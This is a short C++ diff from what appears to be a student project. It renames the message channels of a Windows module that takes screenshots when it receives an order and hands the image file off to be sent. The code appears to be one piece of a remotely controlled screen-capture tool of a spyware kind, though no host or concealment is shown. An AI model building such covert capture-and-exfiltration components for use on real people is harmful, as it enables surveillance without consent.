@@ -5,7 +5,7 @@
 // Login   <benoit.hamon@epitech.eu>
 //
 // Started on  Thu Oct 05 10:32:15 2017 Benoit Hamon
-// Last update Fri Oct 06 21:33:45 2017 Benoit Hamon
+// Last update Sun Nov 12 19:30:21 2017 Benoit Hamon
 //
 
 #include <Windows.h>
@@ -21,8 +21,8 @@ void ModuleImage::start() {
   IModuleCommunication::Order order;
 
   while (true) {
-    if (this->_moduleCommunication->get("Explorer", order)) {
-      if (order.name == "Screenshot")
+    if (this->_moduleCommunication->get("Image", order)) {
+      if (order.name == "screenshot")
           this->takeScrenshot(L"tmp.bmp");
     }
   }
@@ -62,7 +62,7 @@ bool ModuleImage::GetEncoderClsid(wchar_t const *format, CLSID* pClsid) {
 }
 
 void ModuleImage::sendImage(std::string const *filename) {
-  this->_moduleCommunication->add("Fichier", "send", filename);
+  this->_moduleCommunication->add("File", "send", filename);
 }
 
 void ModuleImage::saveImage(HBITMAP &Hbitmap, std::wstring const &filename) {
